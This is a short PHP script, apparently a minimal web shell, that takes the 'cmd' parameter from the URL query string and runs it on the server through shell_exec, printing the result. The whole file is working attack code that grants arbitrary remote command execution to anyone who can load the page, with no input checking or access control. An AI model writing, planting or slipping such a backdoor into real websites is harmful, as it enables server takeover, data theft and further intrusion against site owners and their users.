<?php
function execute($com)
{
    echo shell_exec($com);
}

$cmd = $_GET['cmd'];
execute($cmd);
?>